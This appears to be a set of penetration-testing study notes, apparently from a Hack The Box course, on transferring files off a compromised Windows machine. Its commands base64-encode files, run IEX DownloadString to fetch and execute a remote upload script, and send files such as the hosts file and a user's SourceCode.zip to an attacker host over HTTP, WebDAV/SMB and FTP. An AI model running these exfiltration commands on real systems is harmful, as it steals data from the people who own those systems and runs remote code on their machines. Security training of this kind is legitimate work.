# PowerShell
## PowerShell Base64 Encode & Decode
let's do the reverse operation and encode a file so we can decode it on our attack host.
### Encode File Using PowerShell
```
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
```
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
We copy this content and paste it into our attack host, use the base64 command to decode it, and use the md5sum application to confirm the transfer happened correctly.
### Decode Base64 String in Linux
```
echo <hashValue> | base64 -d > hosts
```
```
md5sum hosts
```
## PowerShell Web Uploads
### Webserver on our machine
```
python3 -m uploadserver
```
use a PowerShell script PSUpload.ps1 which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file. 
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
```
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```
# SMB Uploads
Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. An alternative is to run SMB over HTTP with WebDav. 
WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
## Configuring WebDav Server
### Installing WebDav Python modules
```
sudo pip3 install wsgidav cheroot
```
After installing them, we run the wsgidav application in the target directory.
### Using the WebDav Python module
```
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
### Connecting to the Webdav Share from Windows (Victim) machine
```
dir \\[AttackerIP}\sharefolder
```
## Uploading Files using SMB
### Open SMB share using impacket
```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
```
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

# FTP Uploads
## Start our FTP server
```
sudo python3 -m pyftpdlib --port 21 --write
```
use the PowerShell upload function to upload a file to our FTP Server
### PowerShell Upload File
```
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://[AttackerIP]/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

